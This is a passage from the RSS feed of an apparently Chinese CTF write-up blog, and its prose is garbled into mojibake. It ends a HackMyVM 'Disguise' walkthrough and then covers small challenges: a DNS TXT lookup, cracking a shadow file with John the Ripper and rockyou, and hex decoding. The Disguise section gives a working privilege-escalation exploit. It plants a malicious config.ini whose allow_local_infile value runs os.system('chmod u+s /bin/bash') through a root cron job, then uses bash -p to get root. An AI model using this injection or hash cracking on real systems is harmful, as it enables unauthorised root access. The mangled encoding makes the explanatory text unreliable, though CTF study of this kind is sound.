ËÑöÊú¨‰ΩøÁî®‰∫Ü `mysql.connector.connect(read_default_file=cnf)`ÔºåÂÖ∂‰∏≠`cnf`ÊòØ `/home/darksoul/config.ini`„ÄÇ
Ê£ÄÊü• `config.ini` ÁöÑÊùÉÈôê„ÄÇ

```bash
darksoul@disguise:~$ ls -la config.ini
-rw-r--r-- 1 root root 114 Apr  2 04:03 config.ini
```

Âéü `config.ini` ÊòØrootÊâÄÊúâÔºådarksoul‰∏çÂèØÂÜô„ÄÇ‰ΩÜÊòØdarksoulÂèØ‰ª•Âà†Èô§ÔºàÂõ†‰∏∫Áà∂ÁõÆÂΩï`/home/darksoul`ÊòØdarksoulÂèØÂÜôÁöÑÔºâÔºåÁÑ∂ÂêéÂàõÂª∫‰∏Ä‰∏™ÂêåÂêçÊñá‰ª∂„ÄÇ

ÊàëÂΩìÊó∂ÊòØÊääÂéüÊù•ÁöÑ `config.ini` Â§á‰ªΩÊàê‰∫Ü `config.ini.bak`ÔºåÁÑ∂ÂêéÊñ∞Âª∫‰∫Ü‰∏Ä‰∏™ `config.ini`„ÄÇ

```bash
darksoul@disguise:~$ mv config.ini config.ini.bak # Â¶ÇÊûúÈúÄË¶ÅÂ§á‰ªΩ
darksoul@disguise:~$ touch config.ini
darksoul@disguise:~$ ls -la config.ini
-rw-r--r-- 1 darksoul darksoul 0 May 16 06:57 config.ini
```

Êü•‰∫Ü‰∏Ä‰∏ã `mysql-connector-python` ÁöÑ `exploit`ÔºågoogleÊâæ‰∏çÂà∞Ôºå[[wxÂÖ¨‰ºóÂè∑](https://mp.weixin.qq.com/s/h3qOUrzhANfDJ0PuAJyc6w)](https://mp.weixin.qq.com/s/h3qOUrzhANfDJ0PuAJyc6w)ÊâæÂà∞‰∫Ü„ÄÇ‰ø°ÊÅØÊî∂ÈõÜÁöÑÁªàÁÇπÊòØwxÂÖ¨‰ºóÂè∑ÔºàÊªëÁ®ΩÔºâ„ÄÇ
![image-20250516191958461](https://7r1umphk.github.io/image/20250516191958785.webp)

ÊûÑÈÄ†ÊÅ∂ÊÑèÁöÑ `config.ini`Ôºö

```ini
[client]
user = dark_db_admin
password = Str0ngPassw0d1***
host = localhost
database = dark_shop
port = int(3306)
allow_local_infile=__import__('os').system('chmod u+s /bin/bash')
```

Ëøô‰∏™ `allow_local_infile` ÈÖçÁΩÆÈ°πÔºàÊàñÂÖ∂‰ªñÂèØÂà©Áî®ÁöÑÈÖçÁΩÆÈ°πÔºâ‰ºöË¢´ `mysql.connector.connect` Ëß£ÊûêÂπ∂ÊâßË°åÂêéÈù¢ÁöÑPython‰ª£Á†ÅÔºå‰ªéËÄåÁªô `/bin/bash` Âä†‰∏äSUIDÊùÉÈôê„ÄÇ

Á≠âÂæÖcron‰ªªÂä°ÊâßË°å (ÊúÄÂ§ö1ÂàÜÈíü)„ÄÇÂèØ‰ª•Áî® `pspy64` ÁõëÊéß„ÄÇ

```bash
# pspy64 ËæìÂá∫‰∏≠‰ºöÁúãÂà∞
2025/05/16 07:19:01 CMD: UID=0     PID=16589  | sh -c chmod u+s /bin/bash
```

Ê£ÄÊü• `/bin/bash` ÊùÉÈôê„ÄÇ

```bash
darksoul@disguise:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```

ÊàêÂäüÂä†‰∏äSUIDÊùÉÈôêÔºÅÊâßË°å `bash -p` Ëé∑ÂèñrootÊùÉÈôê„ÄÇ

```bash
darksoul@disguise:~$ bash -p
bash-5.0# id
uid=1000(darksoul) gid=1000(darksoul) euid=0(root) groups=1000(darksoul)
bash-5.0# cat /root/root.txt
#Congratulations!!!
hmv{CVE-2025-21548}
```

ÊàêÂäüËé∑ÂèñrootÊùÉÈôêÂπ∂ËØªÂèñ `/root/root.txt` ‰∏≠ÁöÑflag: `hmv{CVE-2025-21548}`„ÄÇ

# ÂÖ´„ÄÅÊÄªÁªì

Êú¨Ê¨°DisguiseÈù∂Êú∫ÁöÑÊ∏óÈÄèËøáÁ®ãÊ∂âÂèä‰∫ÜWebÂ∫îÁî®Â±ÇÈù¢ÁöÑ‰ø°ÊÅØÊî∂ÈõÜ„ÄÅÊºèÊ¥ûÊâ´Êèè„ÄÅÂ≠êÂüüÂêçÁàÜÁ†¥Ôºå‰ª•ÂèäÈíàÂØπECBÂä†ÂØÜÊ®°Âºè‰∏ãCookieÁöÑÂ∑ßÂ¶ô‰º™ÈÄ†„ÄÇÂêéÁª≠ÈÄöËøáÂØπÁ≥ªÁªüÂÜÖÈÉ®Êñá‰ª∂ÂíåËøõÁ®ãÁöÑÂàÜÊûêÔºåÂèëÁé∞‰∫ÜÊï∞ÊçÆÂ∫ìÂá≠ËØÅÊ≥ÑÈú≤ÂíåcronÂÆöÊó∂‰ªªÂä°ÁöÑÈÖçÁΩÆ‰∏çÂΩìÔºåÊúÄÁªàÁªìÂêàPythonÂ∫ìÁöÑÁâπÊÄßÂÆûÁé∞‰∫ÜÊùÉÈôêÊèêÂçáËá≥root„ÄÇÊï¥‰∏™ËøáÁ®ãÁéØÁéØÁõ∏Êâ£ÔºåÂÖÖÂàÜÂ±ïÁé∞‰∫Ü‰ø°ÊÅØÊî∂ÈõÜÂíåÊºèÊ¥ûÂà©Áî®ÁöÑÈáçË¶ÅÊÄß„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_Disguise-ba-ji-shen-tou-ce-shi-xiang-jie.html</guid><pubDate>Fri, 27 Jun 2025 09:28:56 +0000</pubDate></item><item><title>Challenge 006ÔºöTXTËÆ∞ÂΩïÁöÑÁßòÂØÜ</title><link>https://7r1UMPHK.github.io/post/Challenge%20006%EF%BC%9ATXT-ji-lu-de-mi-mi.html</link><description># ÊåëÊàò‰ø°ÊÅØ

### ÊåëÊàò‰ø°ÊÅØ

*   **ÊåëÊàòÂêçÁß∞/ÁºñÂè∑:** Challenge 006
*   **ÊåëÊàòÈìæÊé•:** [https://hackmyvm.eu/challenges/challenge.php?c=006](https://hackmyvm.eu/challenges/challenge.php?c=006)

### ÂàùÂßãËßÇÂØü

![image-20250518100536187](https://7r1umphk.github.io/image/20250518100536383.webp)

Êàë‰ª¨ÂæóÂà∞‰∫ÜÂÉè `'hackmyvm.eu. 100 IN TXT'` ËøôÊ†∑ÁöÑÊèêÁ§∫ÔºåÈÇ£ÁõÆÊ†áÂ∞±ÈùûÂ∏∏ÊòéÁ°Æ‰∫Ü‚Äî‚ÄîÁõ¥Â•î `hackmyvm.eu` ÁöÑ TXT ËÆ∞ÂΩïÂéªÔºÅ

## Êé¢Á¥¢ËøáÁ®ã

Êúâ‰∫ÜËøô‰πàÊòéÁ°ÆÁöÑÊåáÂêëÔºåÂí±‰ª¨Â∞±Áî® `dig` ÂëΩ‰ª§Êù•‰∏ÄÊé¢Á©∂Á´ü„ÄÇ

### 1.Â∏∏ËßÑAËÆ∞ÂΩïÊü•ËØ¢

ËôΩÁÑ∂ÁõÆÊ†áÁõ¥ÊåáTXTËÆ∞ÂΩïÔºå‰ΩÜÂÖªÊàêÂ•Ω‰π†ÊÉØÔºåÂÖàÁúãÁúãAËÆ∞ÂΩïÊÄªÊ≤°ÈîôÔºå‰∫ÜËß£‰∏Ä‰∏ãÂüüÂêçÊåáÂêëÁöÑIP„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ dig hackmyvm.eu 

; &lt;&lt;&gt;&gt; DiG 9.20.8-6-Debian &lt;&lt;&gt;&gt; hackmyvm.eu
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 62911
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; MBZ: 0x0005, udp: 1232
;; QUESTION SECTION:
;hackmyvm.eu.                   IN      A

;; ANSWER SECTION:
hackmyvm.eu.            5       IN      A       188.68.49.239

;; Query time: 60 msec
;; SERVER: 192.168.205.2#53(192.168.205.2) (UDP)
;; WHEN: Sat May 17 22:05:57 EDT 2025
;; MSG SIZE  rcvd: 56
```

ÂóØÔºå`hackmyvm.eu` ÊåáÂêë `188.68.49.239`„ÄÇ‰ø°ÊÅØgetÔºå‰ΩÜÂØπËøô‰∏™ÁâπÂÆöÊåëÊàòÊù•ËØ¥Ôºå‰∏çÊòØÈáçÁÇπ„ÄÇ

### 2. Êü•ËØ¢TXTËÆ∞ÂΩï

Áé∞Âú®ÔºåÊ†πÊçÆÊàë‰ª¨ÁöÑ‚ÄúÊÉÖÊä•‚ÄùÔºàÊàñËÄÖËØ¥Â∏∏ËßÑÊÄùË∑ØÔºâÔºåÁõ¥Êé•Êü•ËØ¢ `hackmyvm.eu` ÁöÑ TXT ËÆ∞ÂΩï„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ dig txt hackmyvm.eu

; &lt;&lt;&gt;&gt; DiG 9.20.8-6-Debian &lt;&lt;&gt;&gt; txt hackmyvm.eu
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 12739
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; MBZ: 0x0005, udp: 1232
;; QUESTION SECTION:
;hackmyvm.eu.                   IN      TXT

;; ANSWER SECTION:
hackmyvm.eu.            5       IN      TXT     'hmv{sasviyalin}'

;; Query time: 388 msec
;; SERVER: 192.168.205.2#53(192.168.205.2) (UDP)
;; WHEN: Sat May 17 22:06:25 EDT 2025
;; MSG SIZE  rcvd: 68
```

Bingo! ÁúãÂà∞ `ANSWER SECTION` ‰∫ÜÂêóÔºü
`hackmyvm.eu.            5       IN      TXT     'hmv{sasviyalin}'`
Ëøô‰∏çÂ∞±ÊòØÂí±‰ª¨ÂØªÊâæÁöÑ Flag ÂòõÔºÅ

## Flag

ÊØ´Êó†ÁñëÈóÆÔºåFlag Â∞±ÊòØÔºö

`hmv{sasviyalin}`
sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20006%EF%BC%9ATXT-ji-lu-de-mi-mi.html</guid><pubDate>Fri, 27 Jun 2025 09:28:53 +0000</pubDate></item><item><title>Challenge 005 Á†¥Ëß£ Shadow Êñá‰ª∂</title><link>https://7r1UMPHK.github.io/post/Challenge%20005%20-po-jie-%20Shadow%20-wen-jian.html</link><description>### ÊåëÊàò‰ø°ÊÅØ

*   **ÊåëÊàòÂêçÁß∞/ÁºñÂè∑:** Challenge 005
*   **ÊåëÊàòÈìæÊé•:** [https://hackmyvm.eu/challenges/challenge.php?c=005](https://hackmyvm.eu/challenges/challenge.php?c=005)

### ÂàùÂßãËßÇÂØü

![image-20250502152010221](https://7r1umphk.github.io/image/20250502152010304.png)

ËÆøÈóÆÊåëÊàòÈ°µÈù¢ÂêéÔºåÊèèËø∞ÂëäÁü•Êàë‰ª¨Ëé∑Âèñ‰∫Ü‰∏Ä‰∏™ÁõÆÊ†áÊú∫Âô®ÁöÑ `/etc/shadow` Êñá‰ª∂Ôºå‰ΩÜÊó†Ê≥ïÁ†¥Ëß£ÂÖ∂‰∏≠ÁöÑ `root` Áî®Êà∑ÂØÜÁ†Å„ÄÇÊåëÊàòË¶ÅÊ±ÇÊàë‰ª¨ÊâæÂá∫ `root` Áî®Êà∑ÁöÑÂØÜÁ†ÅÔºåÂπ∂‰ª• `HMV{rootpassword}` ÁöÑÊ†ºÂºèÊèê‰∫§ Flag„ÄÇ

È°µÈù¢Êèê‰æõ‰∫Ü‰∏Ä‰∏™Âêç‰∏∫ `shadow.txt` ÁöÑÊñá‰ª∂‰æõ‰∏ãËΩΩ„ÄÇ

### ÂàÜÊûê‰∏éÊäÄÊúØËØ¥Êòé

**1. `/etc/shadow` Êñá‰ª∂:**
Âú® Linux ÂíåÁ±ª Unix Á≥ªÁªü‰∏≠Ôºå`/etc/shadow` Êñá‰ª∂Áî®‰∫éÂÆâÂÖ®Âú∞Â≠òÂÇ®Áî®Êà∑ÁöÑÂØÜÁ†Å‰ø°ÊÅØ„ÄÇ‰∏éÊó©ÊúüÁöÑ `/etc/passwd` Êñá‰ª∂ÔºàÊâÄÊúâÁî®Êà∑ÂèØËØªÔºâ‰∏çÂêåÔºå`/etc/shadow` Êñá‰ª∂ÈÄöÂ∏∏Âè™Êúâ `root` Áî®Êà∑ÊúâËØªÂèñÊùÉÈôêÔºåËøôÂ§ßÂ§ßÊèêÈ´ò‰∫ÜÂØÜÁ†ÅÂÆâÂÖ®ÊÄß„ÄÇËØ•Êñá‰ª∂Â≠òÂÇ®ÁöÑÊòØÁî®Êà∑ÂØÜÁ†ÅÁöÑ**ÂìàÂ∏åÂÄº (Hash)**ÔºåËÄåÈùûÊòéÊñáÂØÜÁ†Å„ÄÇ

‰∏Ä‰∏™ÂÖ∏ÂûãÁöÑ `/etc/shadow` Êñá‰ª∂Êù°ÁõÆÊ†ºÂºèÂ¶Ç‰∏ãÔºö
`username:password_hash:last_password_change:min_days:max_days:warn_days:inactive_days:expire_date:reserved`

Êàë‰ª¨ÂÖ≥ÂøÉÁöÑ‰∏ªË¶ÅÊòØÁ¨¨‰∫å‰∏™Â≠óÊÆµÔºö`password_hash`„ÄÇ

**2. ÂØÜÁ†ÅÂìàÂ∏å:**
ÂØÜÁ†ÅÂìàÂ∏åÊòØ‰∏ÄÁßçÂçïÂêëÂáΩÊï∞Â§ÑÁêÜËøáÁ®ãÔºåÂÆÉÂ∞Ü‰ªªÊÑèÈïøÂ∫¶ÁöÑÂØÜÁ†ÅËΩ¨Êç¢‰∏∫‰∏Ä‰∏™Âõ∫ÂÆöÈïøÂ∫¶ÁöÑ„ÄÅÁúãËµ∑Êù•ÈöèÊú∫ÁöÑÂ≠óÁ¨¶‰∏≤ÔºàÂìàÂ∏åÂÄºÔºâ„ÄÇÂÖ≥ÈîÆÂú®‰∫éËøô‰∏™ËøáÁ®ãÊòØ**‰∏çÂèØÈÄÜÁöÑ**ÔºåÂç≥Êó†Ê≥ï‰ªéÂìàÂ∏åÂÄºÁõ¥Êé•ËÆ°ÁÆóÂá∫ÂéüÂßãÂØÜÁ†Å„ÄÇÂΩìÁî®Êà∑ÁôªÂΩïÊó∂ÔºåÁ≥ªÁªü‰ºöÂ∞ÜÂÖ∂ËæìÂÖ•ÁöÑÂØÜÁ†ÅËøõË°åÁõ∏ÂêåÁöÑÂìàÂ∏åËøêÁÆóÔºåÁÑ∂ÂêéÊØîËæÉËÆ°ÁÆóÂá∫ÁöÑÂìàÂ∏åÂÄº‰∏éÂ≠òÂÇ®Âú® `/etc/shadow` ‰∏≠ÁöÑÂìàÂ∏åÂÄºÊòØÂê¶‰∏ÄËá¥„ÄÇ

Â∏∏ËßÅÁöÑ Linux ÂØÜÁ†ÅÂìàÂ∏åÁÆóÊ≥ïÂåÖÊã¨ MD5crypt (`$1$`)„ÄÅSHA256crypt (`$5$`) Âíå SHA512crypt (`$6$`) Á≠â„ÄÇÂìàÂ∏åÂÄºÂ≠óÁ¨¶‰∏≤ÂºÄÂ§¥ÁöÑ `$id$` ÈÉ®ÂàÜÊ†áËØÜ‰∫ÜÊâÄ‰ΩøÁî®ÁöÑÁÆóÊ≥ï„ÄÇ

**3. ÂØÜÁ†ÅÁ†¥Ëß£ - Â≠óÂÖ∏ÊîªÂáª:**
Áî±‰∫éÊó†Ê≥ï‰ªéÂìàÂ∏åÁõ¥Êé•ÂèçÊé®ÂØÜÁ†ÅÔºåÁ†¥Ëß£ÂØÜÁ†ÅÂìàÂ∏åÁöÑÂ∏∏Áî®ÊñπÊ≥ï‰πã‰∏ÄÊòØ**Â≠óÂÖ∏ÊîªÂáª (Dictionary Attack)**„ÄÇËøôÁßçÊñπÊ≥ï‰æùËµñ‰∫é‰∏Ä‰∏™ÂåÖÂê´Â§ßÈáèÂ∏∏Áî®ÂØÜÁ†Å„ÄÅÂçïËØç„ÄÅÁü≠ËØ≠Á≠âÁöÑÂàóË°®ÔºàÁß∞‰∏∫**Â≠óÂÖ∏Êñá‰ª∂**Êàñ**ËØçÂÖ∏**ÔºåWordlistÔºâ„ÄÇÁ†¥Ëß£Â∑•ÂÖ∑‰ºöÈÄê‰∏ÄËØªÂèñÂ≠óÂÖ∏‰∏≠ÁöÑËØçËØ≠Ôºå‰ΩøÁî®‰∏éÁõÆÊ†áÂìàÂ∏åÁõ∏ÂêåÁöÑÁÆóÊ≥ïËÆ°ÁÆóËØ•ËØçËØ≠ÁöÑÂìàÂ∏åÂÄºÔºåÁÑ∂Âêé‰∏éÁõÆÊ†áÂìàÂ∏åËøõË°åÊØîËæÉ„ÄÇÂ¶ÇÊûúÂåπÈÖçÊàêÂäüÔºåÂ∞±ÊÑèÂë≥ÁùÄÊâæÂà∞‰∫ÜÂéüÂßãÂØÜÁ†Å„ÄÇ

**John the Ripper (John)** ÊòØ‰∏Ä‰∏™ÈùûÂ∏∏ÊµÅË°åÁöÑÂºÄÊ∫êÂØÜÁ†ÅÁ†¥Ëß£Â∑•ÂÖ∑ÔºåÊîØÊåÅÂ§öÁßçÂìàÂ∏åÁ±ªÂûãÂíåÊîªÂáªÊ®°Âºè„ÄÇ`rockyou.txt` ÊòØ‰∏Ä‰∏™ÊûÅÂÖ∂ËëóÂêç‰∏îÂ∫ûÂ§ßÁöÑÂØÜÁ†ÅÂ≠óÂÖ∏Êñá‰ª∂ÔºåÂåÖÂê´‰∫ÜÊï∞Áôæ‰∏á‰∏™‰ªéÁúüÂÆûÊï∞ÊçÆÊ≥ÑÈú≤‰∫ã‰ª∂‰∏≠Êî∂ÈõÜÁöÑÂ∏∏Áî®ÂØÜÁ†ÅÔºåÂ∏∏Áî®‰∫éÂØÜÁ†ÅÂÆâÂÖ®ÂÆ°ËÆ°Âíå CTF ÊØîËµõ„ÄÇ

### Ê±ÇËß£ËøáÁ®ã

1.  **‰∏ãËΩΩÊñá‰ª∂:** ‰ªéÊåëÊàòÈ°µÈù¢‰∏ãËΩΩ `shadow.txt` Êñá‰ª∂„ÄÇ
2.  **ÂáÜÂ§áÂ∑•ÂÖ∑ÂíåÂ≠óÂÖ∏:** Á°Æ‰øùÁ≥ªÁªü‰∏≠ÂÆâË£Ö‰∫Ü `john` (John the Ripper)„ÄÇÂêåÊó∂ÔºåÈúÄË¶Å `rockyou.txt` Â≠óÂÖ∏Êñá‰ª∂„ÄÇÂú® Kali Linux Á≠âÊ∏óÈÄèÊµãËØïÂèëË°åÁâà‰∏≠ÔºåÂÆÉÈÄöÂ∏∏‰Ωç‰∫é `/usr/share/wordlists/rockyou.txt.gz`ÔºåÂèØËÉΩÈúÄË¶ÅÂÖà‰ΩøÁî® `gzip -d /usr/share/wordlists/rockyou.txt.gz` ÂëΩ‰ª§Ëß£ÂéãÁº©„ÄÇ
3.  **ÊâßË°åÁ†¥Ëß£:** ÊâìÂºÄÁªàÁ´ØÔºå‰ΩøÁî® `john` ÂëΩ‰ª§ËøõË°åÂ≠óÂÖ∏ÊîªÂáª„ÄÇÂëΩ‰ª§Ê†ºÂºèÂ¶Ç‰∏ãÔºö
    ```bash
    john --wordlist=&lt;Â≠óÂÖ∏Êñá‰ª∂Ë∑ØÂæÑ&gt; &lt;shadowÊñá‰ª∂Ë∑ØÂæÑ&gt;
    ```
    ÂÖ∑‰ΩìÂà∞Êú¨‰æãÔºåÂëΩ‰ª§‰∏∫Ôºö
    ```bash
    john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
    ```

4.  **ÂàÜÊûêËæìÂá∫:** `john` ‰ºöÂºÄÂßãÂ∞ùËØïÂ≠óÂÖ∏‰∏≠ÁöÑÂØÜÁ†Å„ÄÇÂΩìÊâæÂà∞ÂåπÈÖçÁöÑÂØÜÁ†ÅÊó∂Ôºå‰ºöÊòæÁ§∫Âá∫Êù•„ÄÇÊ†πÊçÆÊèê‰æõÁöÑËß£È¢òËøáÁ®ãÊà™ÂõæÔºå`john` ÁöÑËæìÂá∫ÊòæÁ§∫Ôºö

    ```
    ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/test]
    ‚îî‚îÄ$ john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
    Created directory: /home/kali/.john
    Using default input encoding: UTF-8
    Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x]) 
    Cost 1 (iteration count) is 5000 for all loaded hashes
    Will run 8 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    reddragon        (root)      # &lt;--- ÊàêÂäüÁ†¥Ëß£ÔºÅroot Áî®Êà∑ÁöÑÂØÜÁ†ÅÊòØ reddragon
    1g 0:00:00:00 DONE (2025-05-02 03:18) 2.439g/s 24975p/s 24975c/s 24975C/s total90..1asshole
    Use the '--show' option to display all of the cracked passwords reliably
    Session completed.
    ```
    ËæìÂá∫ÊòéÁ°ÆÊòæÁ§∫ `root` Áî®Êà∑ÁöÑÂØÜÁ†ÅÂ∑≤Ë¢´Á†¥Ëß£Ôºå‰∏∫ `reddragon`„ÄÇ

5.  **Ê†ºÂºèÂåñ Flag:** Ê†πÊçÆÊåëÊàòË¶ÅÊ±ÇÁöÑ `HMV{rootpassword}` Ê†ºÂºèÔºåÂ∞ÜÁ†¥Ëß£ÂæóÂà∞ÁöÑÂØÜÁ†ÅÂ°´ÂÖ•„ÄÇ

### ÁªìÊûúÔºöFlag

ÊàêÂäüÁ†¥Ëß£ÂæóÂà∞ÁöÑ `root` ÂØÜÁ†Å‰∏∫ `reddragon`ÔºåÂõ†Ê≠§ Flag ÊòØÔºö

```
HMV{reddragon}
```
sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20005%20-po-jie-%20Shadow%20-wen-jian.html</guid><pubDate>Fri, 27 Jun 2025 09:28:50 +0000</pubDate></item><item><title>Challenge 004 ÂçÅÂÖ≠ËøõÂà∂ÁöÑÁßòÂØÜ</title><link>https://7r1UMPHK.github.io/post/Challenge%20004%20-shi-liu-jin-zhi-de-mi-mi.html</link><description>### ÊåëÊàò‰ø°ÊÅØ

*   **ÊåëÊàòÂêçÁß∞/ÁºñÂè∑:** Challenge 004
*   **ÊåëÊàòÈìæÊé•:** [https://hackmyvm.eu/challenges/challenge.php?c=004](https://hackmyvm.eu/challenges/challenge.php?c=004)

### ÂàùÂßãËßÇÂØü

![ÊåëÊàò004ÁïåÈù¢](https://7r1umphk.github.io/image/20250502151318558.png)

ËÆøÈóÆÊåëÊàòÈ°µÈù¢ÂêéÔºåÈ°µÈù¢Áõ¥Êé•Â±ïÁ§∫‰∫Ü‰∏ÄÈïø‰∏≤Áî±Êï∞Â≠óÂíåÂ≠óÊØçÁªÑÊàêÁöÑÂ≠óÁ¨¶‰∏≤Ôºö

```
686d767b6d79666c61676973656173797d
```

‰ªªÂä°ÁõÆÊ†áÊòØËß£Á†ÅÊàñËΩ¨Êç¢Ëøô‰∏™Â≠óÁ¨¶‰∏≤‰ª•Ëé∑Âæó Flag„ÄÇ

### ÂàÜÊûê‰∏éÊäÄÊúØËØ¥Êòé

‰ªîÁªÜËßÇÂØüÁªôÂá∫ÁöÑÂ≠óÁ¨¶‰∏≤ `686d767b6d79666c61676973656173797d`ÔºåÊàë‰ª¨ÂèØ‰ª•ÂèëÁé∞ÂÆÉÂÖ∑Êúâ**ÂçÅÂÖ≠ËøõÂà∂ÔºàHexadecimalÔºâ**Ë°®Á§∫Ê≥ïÁöÑÊòæËëóÁâπÂæÅÔºö

1.  **Â≠óÁ¨¶ÈõÜ:** Â≠óÁ¨¶‰∏≤‰ªÖÂåÖÂê´Êï∞Â≠ó `0` Âà∞ `9` ‰ª•ÂèäÂ∞èÂÜôÂ≠óÊØç `a` Âà∞ `f`„ÄÇËøôÊòØÂçÅÂÖ≠ËøõÂà∂Ë°®Á§∫Ê≥ïÁöÑÊ†áÂáÜÂ≠óÁ¨¶ÈõÜÔºàÊúâÊó∂‰πü‰ΩøÁî®Â§ßÂÜô `A` Âà∞ `F`Ôºâ„ÄÇ
2.  **Áî®ÈÄî:** ÂçÅÂÖ≠ËøõÂà∂Â∏∏Áî®‰∫é‰ª•ÊñáÊú¨ÂΩ¢ÂºèÁ¥ßÂáëÂú∞Ë°®Á§∫**‰∫åËøõÂà∂Êï∞ÊçÆ**„ÄÇ‰∏éÁõ¥Êé•ÊòæÁ§∫‰∫åËøõÂà∂Ôºà0Âíå1ÔºâÁõ∏ÊØîÔºåÂçÅÂÖ≠ËøõÂà∂Êõ¥ÊòìËØªÂÜôÔºåÂπ∂‰∏îÊØîÂçÅËøõÂà∂Êõ¥ËÉΩÁõ¥Êé•ÂèçÊò†Â∫ïÂ±ÇÁöÑÊØîÁâπÁªìÊûÑ„ÄÇÂÆÉÂπøÊ≥õÂ∫îÁî®‰∫éÂÜÖÂ≠òÂú∞ÂùÄ„ÄÅÈ¢úËâ≤‰ª£Á†Å„ÄÅÊñá‰ª∂Á≠æÂêç„ÄÅÊï∞ÊçÆÁºñÁ†ÅÁ≠âÈ¢ÜÂüü„ÄÇ
3.  **ÂéüÁêÜ:** ÂçÅÂÖ≠ËøõÂà∂ÊòØ‰∏ÄÁßçÂü∫Êï∞‰∏∫ 16 ÁöÑËÆ°Êï∞Á≥ªÁªü„ÄÇÊØè‰∏™ÂçÅÂÖ≠ËøõÂà∂Êï∞Â≠ó‰ª£Ë°® 4 ‰∏™ÊØîÁâπÔºàÂõ†‰∏∫ 2^4 = 16Ôºâ„ÄÇÂõ†Ê≠§Ôºå**‰∏§‰∏™ÂçÅÂÖ≠ËøõÂà∂Êï∞Â≠ó**ÂèØ‰ª•Á≤æÁ°ÆÂú∞Ë°®Á§∫‰∏Ä‰∏™**Â≠óËäÇÔºà8 ÊØîÁâπÔºâ**„ÄÇÂú®ÂæàÂ§öÊÉÖÂÜµ‰∏ãÔºåÂ∞§ÂÖ∂ÊòØÂú®Â§ÑÁêÜÊñáÊú¨Êï∞ÊçÆÊó∂ÔºåËøô‰∏ÄÂ≠óËäÇÈÄöÂ∏∏ÂØπÂ∫î‰∏Ä‰∏™ ASCII Â≠óÁ¨¶„ÄÇ

### Ëß£Á†ÅËøáÁ®ã

Ëß£Á†ÅÂçÅÂÖ≠ËøõÂà∂Â≠óÁ¨¶‰∏≤ÂèØ‰ª•‰ΩøÁî®Â§öÁßçÂ∑•ÂÖ∑Ôºå**CyberChef** ‰æùÁÑ∂ÊòØ‰∏Ä‰∏™ÈùûÂ∏∏‰æøÊç∑ÁöÑÈÄâÊã©Ôºö

1.  **ËÆøÈóÆ** CyberChef ÁΩëÁ´ô: [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)
2.  **ËæìÂÖ• (Input):** Â∞ÜÂçÅÂÖ≠ËøõÂà∂Â≠óÁ¨¶‰∏≤ `686d767b6d79666c61676973656173797d` Á≤òË¥¥Âà∞‚ÄúInput‚ÄùÊ°Ü‰∏≠„ÄÇ
3.  **ÈÄâÊã©Êìç‰Ωú (Operations):** Âú®Â∑¶‰æßÊìç‰ΩúÂàóË°®‰∏≠ÊêúÁ¥¢ 'From Hex'ÔºåÁÑ∂ÂêéÂ∞ÜÂÖ∂ÊãñÊãΩÂà∞‚ÄúRecipe‚ÄùÂå∫Âüü„ÄÇ
4.  **ËæìÂá∫ (Output):** ‚ÄúOutput‚ÄùÂå∫ÂüüÂ∞ÜËá™Âä®ÊòæÁ§∫Ëß£Á†ÅÂêéÁöÑÁªìÊûú„ÄÇ

‰πüÂèØ‰ª•‰ΩøÁî®ÂëΩ‰ª§Ë°åÂ∑•ÂÖ∑ËøõË°åËß£Á†ÅÔºö

*   Âú® Linux/macOS Á≥ªÁªü‰∏ãÔºåÂèØ‰ª•‰ΩøÁî® `xxd` ÂëΩ‰ª§Ôºö
    ```bash
    echo '686d767b6d79666c61676973656173797d' | xxd -r -p
    ```
* ÊâßË°åËß£Á†ÅÊìç‰ΩúÂêéÔºåÊàë‰ª¨ÂæóÂà∞‰ª•‰∏ã ASCII ÊòéÊñáÂ≠óÁ¨¶‰∏≤Ôºö

```
hmv{myflagiseasy}
```

### ÁªìÊûúÔºöFlag

Ëß£Á†ÅÂêéÁöÑÂ≠óÁ¨¶‰∏≤Âç≥‰∏∫Êú¨ÊåëÊàòÁöÑ Flag„ÄÇ

```
hmv{myflagiseasy}
```
sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20004%20-shi-liu-jin-zhi-de-mi-mi.html</guid><pubDate>Fri, 27 Jun 2025 09:28:48 +0000</pubDate></item><item><title>Challenge 003 Âõæ‰∏≠ÊòØË∞ÅÔºü</title><link>https://7r1UMPHK.github.io/post/Challenge%20003%20-tu-zhong-shi-shui-%EF%BC%9F.html</link><description>### ÊåëÊàò‰ø°ÊÅØ

*   **ÊåëÊàòÂêçÁß∞/ÁºñÂè∑:** Challenge 003
*   **ÊåëÊàòÈìæÊé•:** [https://hackmyvm.eu/challenges/challenge.php?c=003](https://hackmyvm.eu/challenges/challenge.php?c=003)

### ÂàùÂßãËßÇÂØü

![ÊåëÊàò003ÁïåÈù¢ÂèäÈóÆÈ¢ò](https://7r1umphk.github.io/image/20250502150751314.png)

